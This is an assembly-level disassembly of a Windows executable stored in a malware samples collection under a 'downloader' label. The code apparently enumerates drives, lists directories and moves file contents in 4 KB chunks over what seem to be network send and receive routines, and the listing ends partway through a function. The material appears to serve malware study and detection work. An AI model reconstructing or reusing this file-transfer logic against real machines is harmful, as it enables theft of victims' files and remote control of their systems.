
malware_samples/downloader/b13aa04de5a3127d041a1f2e44d6b0ce42d99aec2dbf6278b06aeb634051f08d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	81 ec a8 01 00 00    	sub    $0x1a8,%esp
  401009:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401010:	c7 85 6c fe ff ff 00 	movl   $0x0,-0x194(%ebp)
  401017:	00 00 00 
  40101a:	8d 85 70 fe ff ff    	lea    -0x190(%ebp),%eax
  401020:	50                   	push   %eax
  401021:	e8 8a 07 00 00       	call   0x4017b0
  401026:	83 c4 04             	add    $0x4,%esp
  401029:	c6 85 5b fe ff ff 41 	movb   $0x41,-0x1a5(%ebp)
  401030:	eb 0f                	jmp    0x401041
  401032:	8a 8d 5b fe ff ff    	mov    -0x1a5(%ebp),%cl
  401038:	80 c1 01             	add    $0x1,%cl
  40103b:	88 8d 5b fe ff ff    	mov    %cl,-0x1a5(%ebp)
  401041:	0f be 95 5b fe ff ff 	movsbl -0x1a5(%ebp),%edx
  401048:	83 fa 5a             	cmp    $0x5a,%edx
  40104b:	0f 8f 0a 01 00 00    	jg     0x40115b
  401051:	0f be 85 5b fe ff ff 	movsbl -0x1a5(%ebp),%eax
  401058:	50                   	push   %eax
  401059:	68 90 91 40 00       	push   $0x409190
  40105e:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  401064:	51                   	push   %ecx
  401065:	ff 15 74 90 40 00    	call   *0x409074
  40106b:	83 c4 0c             	add    $0xc,%esp
  40106e:	8d 95 5c fe ff ff    	lea    -0x1a4(%ebp),%edx
  401074:	52                   	push   %edx
  401075:	ff 95 74 ff ff ff    	call   *-0x8c(%ebp)
  40107b:	83 f8 03             	cmp    $0x3,%eax
  40107e:	75 3e                	jne    0x4010be
  401080:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  401086:	50                   	push   %eax
  401087:	8d 8d 60 fe ff ff    	lea    -0x1a0(%ebp),%ecx
  40108d:	51                   	push   %ecx
  40108e:	e8 75 68 00 00       	call   0x407908
  401093:	83 c4 08             	add    $0x8,%esp
  401096:	c7 85 68 fe ff ff 03 	movl   $0x3,-0x198(%ebp)
  40109d:	00 00 00 
  4010a0:	6a 00                	push   $0x0
  4010a2:	6a 00                	push   $0x0
  4010a4:	6a 10                	push   $0x10
  4010a6:	8d 95 60 fe ff ff    	lea    -0x1a0(%ebp),%edx
  4010ac:	52                   	push   %edx
  4010ad:	8b 45 08             	mov    0x8(%ebp),%eax
  4010b0:	50                   	push   %eax
  4010b1:	e8 ca 14 00 00       	call   0x402580
  4010b6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4010b9:	e9 98 00 00 00       	jmp    0x401156
  4010be:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  4010c4:	51                   	push   %ecx
  4010c5:	ff 95 74 ff ff ff    	call   *-0x8c(%ebp)
  4010cb:	83 f8 05             	cmp    $0x5,%eax
  4010ce:	75 3b                	jne    0x40110b
  4010d0:	8d 95 5c fe ff ff    	lea    -0x1a4(%ebp),%edx
  4010d6:	52                   	push   %edx
  4010d7:	8d 85 60 fe ff ff    	lea    -0x1a0(%ebp),%eax
  4010dd:	50                   	push   %eax
  4010de:	e8 25 68 00 00       	call   0x407908
  4010e3:	83 c4 08             	add    $0x8,%esp
  4010e6:	c7 85 68 fe ff ff 05 	movl   $0x5,-0x198(%ebp)
  4010ed:	00 00 00 
  4010f0:	6a 00                	push   $0x0
  4010f2:	6a 00                	push   $0x0
  4010f4:	6a 10                	push   $0x10
  4010f6:	8d 8d 60 fe ff ff    	lea    -0x1a0(%ebp),%ecx
  4010fc:	51                   	push   %ecx
  4010fd:	8b 55 08             	mov    0x8(%ebp),%edx
  401100:	52                   	push   %edx
  401101:	e8 7a 14 00 00       	call   0x402580
  401106:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401109:	eb 4b                	jmp    0x401156
  40110b:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  401111:	50                   	push   %eax
  401112:	ff 95 74 ff ff ff    	call   *-0x8c(%ebp)
  401118:	83 f8 02             	cmp    $0x2,%eax
  40111b:	75 39                	jne    0x401156
  40111d:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  401123:	51                   	push   %ecx
  401124:	8d 95 60 fe ff ff    	lea    -0x1a0(%ebp),%edx
  40112a:	52                   	push   %edx
  40112b:	e8 d8 67 00 00       	call   0x407908
  401130:	83 c4 08             	add    $0x8,%esp
  401133:	c7 85 68 fe ff ff 02 	movl   $0x2,-0x198(%ebp)
  40113a:	00 00 00 
  40113d:	6a 00                	push   $0x0
  40113f:	6a 00                	push   $0x0
  401141:	6a 10                	push   $0x10
  401143:	8d 85 60 fe ff ff    	lea    -0x1a0(%ebp),%eax
  401149:	50                   	push   %eax
  40114a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40114d:	51                   	push   %ecx
  40114e:	e8 2d 14 00 00       	call   0x402580
  401153:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401156:	e9 d7 fe ff ff       	jmp    0x401032
  40115b:	c7 85 6c fe ff ff 01 	movl   $0x1,-0x194(%ebp)
  401162:	00 00 00 
  401165:	6a 00                	push   $0x0
  401167:	6a 00                	push   $0x0
  401169:	6a 10                	push   $0x10
  40116b:	8d 95 60 fe ff ff    	lea    -0x1a0(%ebp),%edx
  401171:	52                   	push   %edx
  401172:	8b 45 08             	mov    0x8(%ebp),%eax
  401175:	50                   	push   %eax
  401176:	e8 05 14 00 00       	call   0x402580
  40117b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40117e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401181:	8b e5                	mov    %ebp,%esp
  401183:	5d                   	pop    %ebp
  401184:	c2 04 00             	ret    $0x4
  401187:	cc                   	int3
  401188:	cc                   	int3
  401189:	cc                   	int3
  40118a:	cc                   	int3
  40118b:	cc                   	int3
  40118c:	cc                   	int3
  40118d:	cc                   	int3
  40118e:	cc                   	int3
  40118f:	cc                   	int3
  401190:	55                   	push   %ebp
  401191:	8b ec                	mov    %esp,%ebp
  401193:	81 ec 20 05 00 00    	sub    $0x520,%esp
  401199:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40119f:	50                   	push   %eax
  4011a0:	e8 0b 06 00 00       	call   0x4017b0
  4011a5:	83 c4 04             	add    $0x4,%esp
  4011a8:	c7 85 88 fd ff ff 00 	movl   $0x0,-0x278(%ebp)
  4011af:	00 00 00 
  4011b2:	c7 85 38 fe ff ff 00 	movl   $0x0,-0x1c8(%ebp)
  4011b9:	00 00 00 
  4011bc:	c7 85 3c fe ff ff 00 	movl   $0x0,-0x1c4(%ebp)
  4011c3:	00 00 00 
  4011c6:	c7 85 0c fe ff ff 00 	movl   $0x0,-0x1f4(%ebp)
  4011cd:	00 00 00 
  4011d0:	c6 85 8c fd ff ff 00 	movb   $0x0,-0x274(%ebp)
  4011d7:	c6 85 18 fe ff ff 00 	movb   $0x0,-0x1e8(%ebp)
  4011de:	8d 8d 48 fc ff ff    	lea    -0x3b8(%ebp),%ecx
  4011e4:	51                   	push   %ecx
  4011e5:	8b 55 0c             	mov    0xc(%ebp),%edx
  4011e8:	52                   	push   %edx
  4011e9:	ff 95 60 ff ff ff    	call   *-0xa0(%ebp)
  4011ef:	89 85 44 fe ff ff    	mov    %eax,-0x1bc(%ebp)
  4011f5:	83 bd 44 fe ff ff ff 	cmpl   $0xffffffff,-0x1bc(%ebp)
  4011fc:	75 46                	jne    0x401244
  4011fe:	c7 85 88 fd ff ff 01 	movl   $0x1,-0x278(%ebp)
  401205:	00 00 00 
  401208:	68 94 91 40 00       	push   $0x409194
  40120d:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  401213:	50                   	push   %eax
  401214:	e8 ef 66 00 00       	call   0x407908
  401219:	83 c4 08             	add    $0x8,%esp
  40121c:	c7 85 3c fe ff ff 01 	movl   $0x1,-0x1c4(%ebp)
  401223:	00 00 00 
  401226:	6a 00                	push   $0x0
  401228:	6a 00                	push   $0x0
  40122a:	68 b8 00 00 00       	push   $0xb8
  40122f:	8d 8d 88 fd ff ff    	lea    -0x278(%ebp),%ecx
  401235:	51                   	push   %ecx
  401236:	8b 55 08             	mov    0x8(%ebp),%edx
  401239:	52                   	push   %edx
  40123a:	e8 41 13 00 00       	call   0x402580
  40123f:	e9 a4 01 00 00       	jmp    0x4013e8
  401244:	68 60 01 00 00       	push   $0x160
  401249:	6a 00                	push   $0x0
  40124b:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  401251:	50                   	push   %eax
  401252:	e8 bd 66 00 00       	call   0x407914
  401257:	83 c4 0c             	add    $0xc,%esp
  40125a:	68 10 05 00 00       	push   $0x510
  40125f:	68 60 01 00 00       	push   $0x160
  401264:	8d 8d e8 fa ff ff    	lea    -0x518(%ebp),%ecx
  40126a:	51                   	push   %ecx
  40126b:	68 80 00 00 00       	push   $0x80
  401270:	8d 95 74 fc ff ff    	lea    -0x38c(%ebp),%edx
  401276:	52                   	push   %edx
  401277:	ff 55 ec             	call   *-0x14(%ebp)
  40127a:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
  401280:	50                   	push   %eax
  401281:	8d 8d 8c fd ff ff    	lea    -0x274(%ebp),%ecx
  401287:	51                   	push   %ecx
  401288:	e8 7b 66 00 00       	call   0x407908
  40128d:	83 c4 08             	add    $0x8,%esp
  401290:	8b 95 48 fc ff ff    	mov    -0x3b8(%ebp),%edx
  401296:	83 e2 10             	and    $0x10,%edx
  401299:	74 0c                	je     0x4012a7
  40129b:	c7 85 38 fe ff ff 01 	movl   $0x1,-0x1c8(%ebp)
  4012a2:	00 00 00 
  4012a5:	eb 0a                	jmp    0x4012b1
  4012a7:	c7 85 38 fe ff ff 00 	movl   $0x0,-0x1c8(%ebp)
  4012ae:	00 00 00 
  4012b1:	8b 85 64 fc ff ff    	mov    -0x39c(%ebp),%eax
  4012b7:	6b c0 ff             	imul   $0xffffffff,%eax,%eax
  4012ba:	03 85 68 fc ff ff    	add    -0x398(%ebp),%eax
  4012c0:	c1 e8 0a             	shr    $0xa,%eax
  4012c3:	83 c0 01             	add    $0x1,%eax
  4012c6:	89 85 0c fe ff ff    	mov    %eax,-0x1f4(%ebp)
  4012cc:	8d 8d e0 fa ff ff    	lea    -0x520(%ebp),%ecx
  4012d2:	51                   	push   %ecx
  4012d3:	8d 95 5c fc ff ff    	lea    -0x3a4(%ebp),%edx
  4012d9:	52                   	push   %edx
  4012da:	ff 95 54 ff ff ff    	call   *-0xac(%ebp)
  4012e0:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4012e3:	50                   	push   %eax
  4012e4:	8d 8d e0 fa ff ff    	lea    -0x520(%ebp),%ecx
  4012ea:	51                   	push   %ecx
  4012eb:	ff 95 58 ff ff ff    	call   *-0xa8(%ebp)
  4012f1:	0f b7 55 fc          	movzwl -0x4(%ebp),%edx
  4012f5:	52                   	push   %edx
  4012f6:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  4012fa:	50                   	push   %eax
  4012fb:	0f b7 4d f8          	movzwl -0x8(%ebp),%ecx
  4012ff:	51                   	push   %ecx
  401300:	0f b7 55 f6          	movzwl -0xa(%ebp),%edx
  401304:	52                   	push   %edx
  401305:	0f b7 45 f2          	movzwl -0xe(%ebp),%eax
  401309:	50                   	push   %eax
  40130a:	0f b7 4d f0          	movzwl -0x10(%ebp),%ecx
  40130e:	51                   	push   %ecx
  40130f:	68 b4 91 40 00       	push   $0x4091b4
  401314:	8d 95 48 fe ff ff    	lea    -0x1b8(%ebp),%edx
  40131a:	52                   	push   %edx
  40131b:	ff 15 74 90 40 00    	call   *0x409074
  401321:	83 c4 20             	add    $0x20,%esp
  401324:	8d 85 48 fe ff ff    	lea    -0x1b8(%ebp),%eax
  40132a:	50                   	push   %eax
  40132b:	8d 8d 18 fe ff ff    	lea    -0x1e8(%ebp),%ecx
  401331:	51                   	push   %ecx
  401332:	e8 d1 65 00 00       	call   0x407908
  401337:	83 c4 08             	add    $0x8,%esp
  40133a:	c7 85 3c fe ff ff 01 	movl   $0x1,-0x1c4(%ebp)
  401341:	00 00 00 
  401344:	68 d4 91 40 00       	push   $0x4091d4
  401349:	8d 95 74 fc ff ff    	lea    -0x38c(%ebp),%edx
  40134f:	52                   	push   %edx
  401350:	e8 b9 65 00 00       	call   0x40790e
  401355:	83 c4 08             	add    $0x8,%esp
  401358:	85 c0                	test   %eax,%eax
  40135a:	74 18                	je     0x401374
  40135c:	68 d8 91 40 00       	push   $0x4091d8
  401361:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
  401367:	50                   	push   %eax
  401368:	e8 a1 65 00 00       	call   0x40790e
  40136d:	83 c4 08             	add    $0x8,%esp
  401370:	85 c0                	test   %eax,%eax
  401372:	75 02                	jne    0x401376
  401374:	eb 26                	jmp    0x40139c
  401376:	6a 00                	push   $0x0
  401378:	6a 00                	push   $0x0
  40137a:	68 b8 00 00 00       	push   $0xb8
  40137f:	8d 8d 88 fd ff ff    	lea    -0x278(%ebp),%ecx
  401385:	51                   	push   %ecx
  401386:	8b 55 08             	mov    0x8(%ebp),%edx
  401389:	52                   	push   %edx
  40138a:	e8 f1 11 00 00       	call   0x402580
  40138f:	ff 95 5c ff ff ff    	call   *-0xa4(%ebp)
  401395:	83 f8 12             	cmp    $0x12,%eax
  401398:	75 02                	jne    0x40139c
  40139a:	eb 1c                	jmp    0x4013b8
  40139c:	8d 85 48 fc ff ff    	lea    -0x3b8(%ebp),%eax
  4013a2:	50                   	push   %eax
  4013a3:	8b 8d 44 fe ff ff    	mov    -0x1bc(%ebp),%ecx
  4013a9:	51                   	push   %ecx
  4013aa:	ff 95 64 ff ff ff    	call   *-0x9c(%ebp)
  4013b0:	85 c0                	test   %eax,%eax
  4013b2:	0f 85 8c fe ff ff    	jne    0x401244
  4013b8:	c7 85 3c fe ff ff 00 	movl   $0x0,-0x1c4(%ebp)
  4013bf:	00 00 00 
  4013c2:	6a 00                	push   $0x0
  4013c4:	6a 00                	push   $0x0
  4013c6:	68 b8 00 00 00       	push   $0xb8
  4013cb:	8d 95 88 fd ff ff    	lea    -0x278(%ebp),%edx
  4013d1:	52                   	push   %edx
  4013d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4013d5:	50                   	push   %eax
  4013d6:	e8 a5 11 00 00       	call   0x402580
  4013db:	8b 8d 44 fe ff ff    	mov    -0x1bc(%ebp),%ecx
  4013e1:	51                   	push   %ecx
  4013e2:	ff 95 68 ff ff ff    	call   *-0x98(%ebp)
  4013e8:	8b e5                	mov    %ebp,%esp
  4013ea:	5d                   	pop    %ebp
  4013eb:	c2 08 00             	ret    $0x8
  4013ee:	cc                   	int3
  4013ef:	cc                   	int3
  4013f0:	55                   	push   %ebp
  4013f1:	8b ec                	mov    %esp,%ebp
  4013f3:	81 ec e8 04 00 00    	sub    $0x4e8,%esp
  4013f9:	56                   	push   %esi
  4013fa:	57                   	push   %edi
  4013fb:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  401401:	50                   	push   %eax
  401402:	e8 a9 03 00 00       	call   0x4017b0
  401407:	83 c4 04             	add    $0x4,%esp
  40140a:	c7 85 b8 fd ff ff 00 	movl   $0x0,-0x248(%ebp)
  401411:	00 00 00 
  401414:	c7 85 68 fe ff ff 00 	movl   $0x0,-0x198(%ebp)
  40141b:	00 00 00 
  40141e:	c7 85 6c fe ff ff 00 	movl   $0x0,-0x194(%ebp)
  401425:	00 00 00 
  401428:	c7 85 3c fe ff ff 00 	movl   $0x0,-0x1c4(%ebp)
  40142f:	00 00 00 
  401432:	c6 85 bc fd ff ff 00 	movb   $0x0,-0x244(%ebp)
  401439:	c6 85 48 fe ff ff 00 	movb   $0x0,-0x1b8(%ebp)
  401440:	8d 8d 78 fc ff ff    	lea    -0x388(%ebp),%ecx
  401446:	51                   	push   %ecx
  401447:	8b 55 0c             	mov    0xc(%ebp),%edx
  40144a:	52                   	push   %edx
  40144b:	ff 95 70 ff ff ff    	call   *-0x90(%ebp)
  401451:	89 85 74 fe ff ff    	mov    %eax,-0x18c(%ebp)
  401457:	68 60 01 00 00       	push   $0x160
  40145c:	6a 00                	push   $0x0
  40145e:	8d 85 18 fb ff ff    	lea    -0x4e8(%ebp),%eax
  401464:	50                   	push   %eax
  401465:	e8 aa 64 00 00       	call   0x407914
  40146a:	83 c4 0c             	add    $0xc,%esp
  40146d:	68 10 05 00 00       	push   $0x510
  401472:	68 60 01 00 00       	push   $0x160
  401477:	8d 8d 18 fb ff ff    	lea    -0x4e8(%ebp),%ecx
  40147d:	51                   	push   %ecx
  40147e:	68 80 00 00 00       	push   $0x80
  401483:	8d 95 a4 fc ff ff    	lea    -0x35c(%ebp),%edx
  401489:	52                   	push   %edx
  40148a:	ff 55 fc             	call   *-0x4(%ebp)
  40148d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401490:	50                   	push   %eax
  401491:	8d 8d bc fd ff ff    	lea    -0x244(%ebp),%ecx
  401497:	51                   	push   %ecx
  401498:	e8 6b 64 00 00       	call   0x407908
  40149d:	83 c4 08             	add    $0x8,%esp
  4014a0:	8b 95 94 fc ff ff    	mov    -0x36c(%ebp),%edx
  4014a6:	6b d2 ff             	imul   $0xffffffff,%edx,%edx
  4014a9:	03 95 98 fc ff ff    	add    -0x368(%ebp),%edx
  4014af:	89 95 3c fe ff ff    	mov    %edx,-0x1c4(%ebp)
  4014b5:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  4014ba:	8d b5 b8 fd ff ff    	lea    -0x248(%ebp),%esi
  4014c0:	8b 7d 08             	mov    0x8(%ebp),%edi
  4014c3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4014c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4014c8:	5f                   	pop    %edi
  4014c9:	5e                   	pop    %esi
  4014ca:	8b e5                	mov    %ebp,%esp
  4014cc:	5d                   	pop    %ebp
  4014cd:	c2 08 00             	ret    $0x8
  4014d0:	55                   	push   %ebp
  4014d1:	8b ec                	mov    %esp,%ebp
  4014d3:	b8 98 11 00 00       	mov    $0x1198,%eax
  4014d8:	e8 43 64 00 00       	call   0x407920
  4014dd:	c6 45 fb 00          	movb   $0x0,-0x5(%ebp)
  4014e1:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  4014e7:	50                   	push   %eax
  4014e8:	e8 c3 02 00 00       	call   0x4017b0
  4014ed:	83 c4 04             	add    $0x4,%esp
  4014f0:	68 dc 91 40 00       	push   $0x4091dc
  4014f5:	8d 4d 10             	lea    0x10(%ebp),%ecx
  4014f8:	51                   	push   %ecx
  4014f9:	ff 15 88 90 40 00    	call   *0x409088
  4014ff:	83 c4 08             	add    $0x8,%esp
  401502:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401505:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401509:	75 07                	jne    0x401512
  40150b:	32 c0                	xor    %al,%al
  40150d:	e9 5f 01 00 00       	jmp    0x401671
  401512:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  401519:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40151c:	3b 95 90 00 00 00    	cmp    0x90(%ebp),%edx
  401522:	0f 83 3a 01 00 00    	jae    0x401662
  401528:	8b 85 90 00 00 00    	mov    0x90(%ebp),%eax
  40152e:	2b 45 f4             	sub    -0xc(%ebp),%eax
  401531:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401536:	0f 86 8f 00 00 00    	jbe    0x4015cb
  40153c:	6a 00                	push   $0x0
  40153e:	6a 00                	push   $0x0
  401540:	68 00 10 00 00       	push   $0x1000
  401545:	8d 8d 68 ee ff ff    	lea    -0x1198(%ebp),%ecx
  40154b:	51                   	push   %ecx
  40154c:	8b 55 08             	mov    0x8(%ebp),%edx
  40154f:	52                   	push   %edx
  401550:	e8 bb 11 00 00       	call   0x402710
  401555:	85 c0                	test   %eax,%eax
  401557:	75 20                	jne    0x401579
  401559:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40155c:	50                   	push   %eax
  40155d:	ff 15 84 90 40 00    	call   *0x409084
  401563:	83 c4 04             	add    $0x4,%esp
  401566:	8d 4d 10             	lea    0x10(%ebp),%ecx
  401569:	51                   	push   %ecx
  40156a:	ff 95 a0 fe ff ff    	call   *-0x160(%ebp)
  401570:	32 c0                	xor    %al,%al
  401572:	e9 fa 00 00 00       	jmp    0x401671
  401577:	eb 4d                	jmp    0x4015c6
  401579:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40157c:	52                   	push   %edx
  40157d:	68 00 10 00 00       	push   $0x1000
  401582:	6a 01                	push   $0x1
  401584:	8d 85 68 ee ff ff    	lea    -0x1198(%ebp),%eax
  40158a:	50                   	push   %eax
  40158b:	ff 15 80 90 40 00    	call   *0x409080
  401591:	83 c4 10             	add    $0x10,%esp
  401594:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401599:	74 20                	je     0x4015bb
  40159b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40159e:	51                   	push   %ecx
  40159f:	ff 15 84 90 40 00    	call   *0x409084
  4015a5:	83 c4 04             	add    $0x4,%esp
  4015a8:	8d 55 10             	lea    0x10(%ebp),%edx
  4015ab:	52                   	push   %edx
  4015ac:	ff 95 a0 fe ff ff    	call   *-0x160(%ebp)
  4015b2:	32 c0                	xor    %al,%al
  4015b4:	e9 b8 00 00 00       	jmp    0x401671
  4015b9:	eb 0b                	jmp    0x4015c6
  4015bb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4015be:	05 00 10 00 00       	add    $0x1000,%eax
  4015c3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4015c6:	e9 92 00 00 00       	jmp    0x40165d
  4015cb:	6a 00                	push   $0x0
  4015cd:	6a 00                	push   $0x0
  4015cf:	8b 8d 90 00 00 00    	mov    0x90(%ebp),%ecx
  4015d5:	2b 4d f4             	sub    -0xc(%ebp),%ecx
  4015d8:	51                   	push   %ecx
  4015d9:	8d 95 68 ee ff ff    	lea    -0x1198(%ebp),%edx
  4015df:	52                   	push   %edx
  4015e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4015e3:	50                   	push   %eax
  4015e4:	e8 27 11 00 00       	call   0x402710
  4015e9:	85 c0                	test   %eax,%eax
  4015eb:	75 1d                	jne    0x40160a
  4015ed:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4015f0:	51                   	push   %ecx
  4015f1:	ff 15 84 90 40 00    	call   *0x409084
  4015f7:	83 c4 04             	add    $0x4,%esp
  4015fa:	8d 55 10             	lea    0x10(%ebp),%edx
  4015fd:	52                   	push   %edx
  4015fe:	ff 95 a0 fe ff ff    	call   *-0x160(%ebp)
  401604:	32 c0                	xor    %al,%al
  401606:	eb 69                	jmp    0x401671
  401608:	eb 53                	jmp    0x40165d
  40160a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40160d:	50                   	push   %eax
  40160e:	8b 8d 90 00 00 00    	mov    0x90(%ebp),%ecx
  401614:	2b 4d f4             	sub    -0xc(%ebp),%ecx
  401617:	51                   	push   %ecx
  401618:	6a 01                	push   $0x1
  40161a:	8d 95 68 ee ff ff    	lea    -0x1198(%ebp),%edx
  401620:	52                   	push   %edx
  401621:	ff 15 80 90 40 00    	call   *0x409080
  401627:	83 c4 10             	add    $0x10,%esp
  40162a:	8b 8d 90 00 00 00    	mov    0x90(%ebp),%ecx
  401630:	2b 4d f4             	sub    -0xc(%ebp),%ecx
  401633:	3b c1                	cmp    %ecx,%eax
  401635:	74 1d                	je     0x401654
  401637:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40163a:	52                   	push   %edx
  40163b:	ff 15 84 90 40 00    	call   *0x409084
  401641:	83 c4 04             	add    $0x4,%esp
  401644:	8d 45 10             	lea    0x10(%ebp),%eax
  401647:	50                   	push   %eax
  401648:	ff 95 a0 fe ff ff    	call   *-0x160(%ebp)
  40164e:	32 c0                	xor    %al,%al
  401650:	eb 1f                	jmp    0x401671
  401652:	eb 09                	jmp    0x40165d
  401654:	8b 8d 90 00 00 00    	mov    0x90(%ebp),%ecx
  40165a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40165d:	e9 b7 fe ff ff       	jmp    0x401519
  401662:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401665:	52                   	push   %edx
  401666:	ff 15 84 90 40 00    	call   *0x409084
  40166c:	83 c4 04             	add    $0x4,%esp
  40166f:	b0 01                	mov    $0x1,%al
  401671:	8b e5                	mov    %ebp,%esp
  401673:	5d                   	pop    %ebp
  401674:	c2 bc 00             	ret    $0xbc
  401677:	cc                   	int3
  401678:	cc                   	int3
  401679:	cc                   	int3
  40167a:	cc                   	int3
  40167b:	cc                   	int3
  40167c:	cc                   	int3
  40167d:	cc                   	int3
  40167e:	cc                   	int3
  40167f:	cc                   	int3
  401680:	55                   	push   %ebp
  401681:	8b ec                	mov    %esp,%ebp
  401683:	b8 0c 10 00 00       	mov    $0x100c,%eax
  401688:	e8 93 62 00 00       	call   0x407920
  40168d:	68 e0 91 40 00       	push   $0x4091e0
  401692:	8d 45 10             	lea    0x10(%ebp),%eax
  401695:	50                   	push   %eax
  401696:	ff 15 88 90 40 00    	call   *0x409088
  40169c:	83 c4 08             	add    $0x8,%esp
  40169f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4016a2:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4016a6:	75 07                	jne    0x4016af
  4016a8:	32 c0                	xor    %al,%al
  4016aa:	e9 f4 00 00 00       	jmp    0x4017a3
  4016af:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4016b6:	6a 02                	push   $0x2
  4016b8:	6a 00                	push   $0x0
  4016ba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4016bd:	51                   	push   %ecx
  4016be:	ff 15 94 90 40 00    	call   *0x409094
  4016c4:	83 c4 0c             	add    $0xc,%esp
  4016c7:	85 c0                	test   %eax,%eax
  4016c9:	74 14                	je     0x4016df
  4016cb:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4016ce:	52                   	push   %edx
  4016cf:	ff 15 84 90 40 00    	call   *0x409084
  4016d5:	83 c4 04             	add    $0x4,%esp
  4016d8:	32 c0                	xor    %al,%al
  4016da:	e9 c4 00 00 00       	jmp    0x4017a3
  4016df:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4016e2:	50                   	push   %eax
  4016e3:	ff 15 90 90 40 00    	call   *0x409090
  4016e9:	83 c4 04             	add    $0x4,%esp
  4016ec:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4016ef:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
  4016f3:	75 14                	jne    0x401709
  4016f5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4016f8:	51                   	push   %ecx
  4016f9:	ff 15 84 90 40 00    	call   *0x409084
  4016ff:	83 c4 04             	add    $0x4,%esp
  401702:	32 c0                	xor    %al,%al
  401704:	e9 9a 00 00 00       	jmp    0x4017a3
  401709:	6a 00                	push   $0x0
  40170b:	6a 00                	push   $0x0
  40170d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401710:	52                   	push   %edx
  401711:	ff 15 94 90 40 00    	call   *0x409094
  401717:	83 c4 0c             	add    $0xc,%esp
  40171a:	85 c0                	test   %eax,%eax
  40171c:	74 11                	je     0x40172f
  40171e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401721:	50                   	push   %eax
  401722:	ff 15 84 90 40 00    	call   *0x409084
  401728:	83 c4 04             	add    $0x4,%esp
  40172b:	32 c0                	xor    %al,%al
  40172d:	eb 74                	jmp    0x4017a3
  40172f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401732:	89 8d 90 00 00 00    	mov    %ecx,0x90(%ebp)
  401738:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40173b:	52                   	push   %edx
  40173c:	68 00 10 00 00       	push   $0x1000
  401741:	6a 01                	push   $0x1
  401743:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
  401749:	50                   	push   %eax
  40174a:	ff 15 8c 90 40 00    	call   *0x40908c
  401750:	83 c4 10             	add    $0x10,%esp
  401753:	89 85 f4 ef ff ff    	mov    %eax,-0x100c(%ebp)
  401759:	83 bd f4 ef ff ff 00 	cmpl   $0x0,-0x100c(%ebp)
  401760:	74 32                	je     0x401794
  401762:	6a 00                	push   $0x0
  401764:	6a 00                	push   $0x0
  401766:	8b 8d f4 ef ff ff    	mov    -0x100c(%ebp),%ecx
  40176c:	51                   	push   %ecx
  40176d:	8d 95 f8 ef ff ff    	lea    -0x1008(%ebp),%edx
  401773:	52                   	push   %edx
  401774:	8b 45 08             	mov    0x8(%ebp),%eax
  401777:	50                   	push   %eax
  401778:	e8 03 0e 00 00       	call   0x402580
  40177d:	85 c0                	test   %eax,%eax
  40177f:	75 11                	jne    0x401792
  401781:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401784:	51                   	push   %ecx
  401785:	ff 15 84 90 40 00    	call   *0x409084
  40178b:	83 c4 04             	add    $0x4,%esp
  40178e:	32 c0                	xor    %al,%al
  401790:	eb 11                	jmp    0x4017a3
  401792:	eb a4                	jmp    0x401738
  401794:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401797:	52                   	push   %edx
  401798:	ff 15 84 90 40 00    	call   *0x409084
  40179e:	83 c4 04             	add    $0x4,%esp
  4017a1:	b0 01                	mov    $0x1,%al
